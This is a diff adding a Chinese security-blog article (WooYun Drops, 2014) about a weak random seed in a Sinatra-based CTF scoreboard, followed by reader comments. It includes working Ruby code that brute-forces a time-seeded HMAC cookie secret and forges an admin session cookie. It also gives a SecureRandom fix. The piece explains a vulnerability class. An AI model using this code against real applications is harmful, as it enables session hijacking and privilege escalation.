@@ -1,0 +1,54 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">弱随机化种子漏洞科普</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">∑-TEAM</a> <span class="bull">·</span> <time title="2014/04/15 11:29" ui-time="" datetime="2014/04/15 11:29" class="published ng-binding ng-isolate-scope">2014/04/15 11:29</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>上周我参加了一个Bishop Fox和BYU大学举办的CTF比赛，在比赛过程中我决定尝试一下入侵一下计分系统，并且我把入侵的过程记录了下来。</p><p>尽管客户端的token欺骗已经不是什么新鲜事了，但是这次的入侵过程可以作为weak randomness漏洞的一个很好的练习。（这次攻击目标所使用的框架并不是像Rails一样常用的框架）</p><p>最后说一句：这个漏洞是框架自己带有的而不是Bishop Fox 或者是 BYU的问题。</p><h2>0x01 cookie运行原理</h2><hr><p>在开始之前，我推荐你阅读一下<a href="http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/">这篇博文</a>，他会告送你一个基于ruby的webapps如何处理cookie。</p><p>简而言之，ruby会生成一个hash数值作为一个cookie存储在用户客户端像这样</p><pre><code>{ 'session_id' =&gt; '78894f58c088a9c6555370a0d97e373e715b91bc' }  
+</code></pre><p>之后ruby分为三步把他存储到客户端</p><pre><code>(1)使用Marshal.dump对数据结构进行序列化  
+(2)使用base64编码第一步得到的字符串  
+(3)计算message的HMAC（HMAC被用于message的完整性检查，这是ruby的一种机制以防用户篡改自己的cookie）  
+</code></pre><p>当以上三步做完之后，ruby会在头文件中加入如下一段</p><pre><code>Set-Cookie:"rack.session={base64-encoded message body}--{hmac};"  
+</code></pre><p>实际的cookie是这样</p><pre><code>Set-Cookie:"rack.session=BAh7BkkiD3Nlc3Npb25faWQGOgZFVEkiRTViNDY1NjdkYTAzYjYwYTdlZGIy%0ANDg4NWEyMzVlY2E2YzRkYmM5M2IwYzgxZWJlMDc1NmQ0NGRmODE0ZjEzYjAG%0AOwBG%0A--2148e8dc04eeba3bf0f4e0d70c04465b61c4758d;"  
+</code></pre><p>上述处理cookie的过程有一个漏洞，message中的信息可以被客户端还原，只需要对它进行base64解码和反序列化即可得到原始的ruby object</p><p>ruby对于cookie信任的前提是，通过HMAC验证message中的内容必须是有你代码中设定的密钥标记过的，只有这样ruby才会把cookie当做一个有效地凭证。</p><p>下图就是上述过程简要流程</p><p><img alt="enter image description here" img-src="055922c2350a151ab3b124ca24eceebeb90f9860.jpg"></p><p>如果你篡改了你的cookie，会导致HMAC验证不通过，从而使你修改过的cookie值失效。</p><h2>0x02 简介</h2><hr><p>CTF的评分系统是一个Sinatra-based的webapp，它使用了一些基本的Rails机制，提供了一个计分板的效果。看一下代码，还是比较简洁的。</p><p>这个webapp有一个有趣的现象就是，默认情况下代码库中没有配置文件，配置文件是在程序运行过程中生成的，下面是创建配置文件的代码。</p><pre><code>#!ruby
+begin
+  require './config.rb'
+rescue Exception =&gt; e
+  # create default config.rb
+  open('./config.rb', "w+") {|f|
+    f.puts &lt;&lt;-"EOS"
+COOKIE_SECRET = "#{Digest::SHA1.hexdigest(Time.now.to_s)}"
+ADMIN_PASS_SHA1 = "08a567fa1a826eeb981c6762a40576f14d724849" #ctfadmin
+STYLE_SHEET = "/style.css"
+HTML_TITLE = "scoreserver.rb CTF"
+EOS
+    f.flush
+  }
+  require './config.rb'
+end
+</code></pre><p>值得注意的是，COOKIE_SECERT就是前文中提到的HMAC所使用的key。他是<code>Time.now.to_s</code>的SHA-1散列。这段代码中所使用的<code>Time.now.to_s</code>就是我们所说的不健壮的随机化种子。</p><h2>0x03 原理</h2><hr><p>现在我们很容易知道，如果想要伪造cookie，就必须得到一个合法的HMAC字符串，只有得到它之后，我们才可以通过修改session-id来控制session。</p><p>这个漏洞的根源是因为它使用了，弱随机化种子，在上文的代码中，SHA1-hashing 加密了一个秒级别的精度的字符串，这样我们就可以使用暴力的方法尝试一天之内秒数只需要<code>60 x 60 x 24</code>次尝试。</p><p>而且我们并不需要把每次的尝试结果提交到web服务器，只需要在本地计算出正确的key，然后再通过它构造出正确的HMAC提交即可。</p><h2>0x04 POC</h2><hr><p>为了确定一下我们是否可以破解HMAC，我们可以试一下。</p><p>首先，我们从webapp得到cookie和HMAC。如果你想自己测试，copy以下代码运行即可。</p><pre><code>#!ruby
+require 'faraday'
+
+connection = Faraday.new(:url =&gt; 'http://localhost:4567')
+response = connection.get '/'
+cookie, hmac = response.headers[:'set-cookie'].split.first.chop.split('=').last.split('--')
+</code></pre><p>现在我们只需要不断的获取Time.now和创建HMACs直到匹配为止。我们通过一个循环依次减小时间，直到找到正确的时间使得SHA1散列匹配而得到session key。</p><pre><code>#!ruby
+require 'digest/sha1'
+require 'openssl'
+
+def create_hmac message, key
+  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, key, CGI.unescape(message))
+end
+
+seed = Time.now
+
+while (hmac != create_hmac(cookie, Digest::SHA1.hexdigest(seed.to_s))) do
+    seed -= 1
+end
+
+key = Digest::SHA1.hexdigest(seed.to_s)
+</code></pre><p>这样我们就可以成功破解key了，这个key可以帮助我们创建合法的HMAC。</p><h2>0x05 利用</h2><hr><p>得到了key，我们就可以找一下源代码中有什么能让我们提升权限的地方。</p><p>首先，代码会对cookie进行反序列化。</p><pre><code>#!ruby
+params = Marshal.load(Base64.decode64(CGI.unescape(cookie)))
+</code></pre><p>这样修改之后，我们就可以赋予自己管理员权限。</p><pre><code>#!ruby
+params.merge!({ 'admin' =&gt; true })
+</code></pre><p>通过上述语句重建cookie</p><pre><code>#!ruby
+bad_cookie = CGI.escape(Base64.encode64(Marshal.dump(params)))
+bad_hmac = create_hmac(bad_cookie, key)
+header = "rack.session=#{bad_cookie}--#{bad_hmac};"
+</code></pre><p>只要把上面得到的cookie内容，加到header里面就可以获取管理员权限了。</p><p>到达这一步只要查看源代码就可以很轻易地获取到每一题的答案了。</p><h2>0x06 防御方法</h2><hr><p>我在github上提交了一个修改版本，其中使用这句代替了cookie secret key的生成</p><pre><code>Digest::SHA1.hexdigest(Time.now.to_s)  
+</code></pre><p>使用SecureRandom库生成随机数</p><pre><code>SecureRandom.hex(20)  
+</code></pre><p>这会生成一个40个字符的随机字符串</p><h2>0x07 结论</h2><hr><p>这篇文章虽然在技术上没有什么实质性突破，但是作为一个弱随机漏洞的例子还是很不错的，希望在思路上可以启发到各位。</p><p>from:<a href="http://blog.tjll.net/weak-random-seed-rack-exploit/">http://blog.tjll.net/weak-random-seed-rack-exploit/</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/1409" rel="bookmark" id="re1">WordPress 3.8.2 cookie伪造漏洞再分析</a></li><li><a href="http://drops.wooyun.org/papers/653" rel="bookmark" id="re2">搭建基于Suricata+Barnyard2+Base的IDS前端Snorby</a></li><li><a href="http://drops.wooyun.org/papers/576" rel="bookmark" id="re3">老外的一份渗透测试报告</a></li><li><a href="http://drops.wooyun.org/tips/4070" rel="bookmark" id="re4">HCTF writeup(web)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">thanatos</span> <span class="reply-time">2016-01-04 10:08:40</span></div><p></p><p>有个重要前提，看到源码。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-04-21 10:41:43</span></div><p></p><p>good job! 已修改~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">yangff</span> <span class="reply-time">2014-04-21 08:51:49</span></div><p></p><p>这个漏洞是[扩]架</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-04-15 21:57:39</span></div><p></p><p>写得不错，但往往在弄到源码前你是没法这样做爆破。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龙臣</span> <span class="reply-time">2014-04-15 19:04:56</span></div><p></p><p>你有多少马甲？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">你为何这么叼</span> <span class="reply-time">2014-04-15 14:38:08</span></div><p></p><p>你为何这么叼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-04-15 14:10:50</span></div><p></p><p>你为何这么叼</p><p></p></div></div></div></div></div></main>
